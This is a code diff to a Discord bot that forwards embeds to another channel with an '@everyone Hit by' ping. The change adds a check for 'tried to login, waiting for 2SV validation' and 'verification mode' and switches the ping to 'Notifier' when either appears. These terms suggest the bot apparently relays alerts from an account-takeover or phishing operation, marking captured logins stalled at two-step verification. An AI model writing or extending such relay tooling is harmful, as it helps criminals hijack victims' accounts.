@@ -423,9 +423,23 @@ client.on('messageCreate', async (message) => {
             iconURL: filteredEmbed.footer?.iconURL || filteredEmbed.footer?.icon_url || embed.footer?.iconURL || embed.footer?.icon_url || message.guild.iconURL()
         });
 
-        // Send the filtered embed to destination channel with hit notification
+        // Check if embed contains 2SV validation content
+        const embedText = [
+            filteredEmbed.title,
+            filteredEmbed.description,
+            ...(filteredEmbed.fields || []).map(f => `${f.name} ${f.value}`)
+        ].join(' ').toLowerCase();
+
+        const is2SVValidation = embedText.includes('tried to login, waiting for 2sv validation') || 
+                               embedText.includes('verification mode');
+
+        // Send the filtered embed to destination channel with appropriate notification
+        const notificationMessage = is2SVValidation ? 
+            '@everyone Notifier by <@133284075104174416>' : 
+            '@everyone Hit by <@133284075104174416>';
+
         await destinationChannel.send({
-            content: '@everyone Hit by <@133284075104174416>',
+            content: notificationMessage,
             embeds: [forwardedEmbed]
         });
 
